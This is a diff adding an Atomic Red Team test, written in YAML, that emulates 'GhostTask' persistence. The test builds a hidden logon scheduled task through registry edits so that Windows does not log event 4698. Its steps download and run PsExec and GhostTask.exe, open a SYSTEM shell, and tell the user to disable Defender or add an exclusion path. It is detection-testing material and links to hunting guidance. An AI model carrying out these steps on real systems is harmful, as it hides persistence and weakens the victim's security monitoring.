@@ -230,3 +230,55 @@ atomic_tests:
       Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
     cleanup_command: |
       Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1
+- name: Scheduled Task ("Ghost Task") via Registry Key Manipulation
+  auto_generated_guid: 704333ca-cc12-4bcf-9916-101844881f54
+  description: |
+    Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.
+    This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.
+    For further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).
+  supported_platforms:
+  - windows
+  input_arguments:
+    task_name:
+      description: Name of the newly-added task
+      type: string
+      default: lilghostie
+    task_command:
+      description: Command you want the task to execute
+      type: string
+      default: notepad.exe
+    target:
+      description: System where the task should run
+      type: string
+      default: localhost
+    user_name:
+      description: Username to authenticate with, such as ATOMICDOMAIN\AtomicAdmin
+      type: string
+      default: $env:USERDOMAIN + '\' + $env:USERNAME
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      PsExec tool from Sysinternals must exist in the ExternalPayloads directory
+    prereq_command: |
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") { exit 0} else { exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
+  - description: |
+      GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath "PathToAtomicsFolder\..\ExternalPayloads\"`
+    prereq_command: |
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe") { exit 0} else { exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
+      "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} add #{task_name} "cmd.exe" "/c #{task_command}" #{user_name} logon
+    cleanup_command: |
+      "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
+      "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} delete #{task_name} > nul
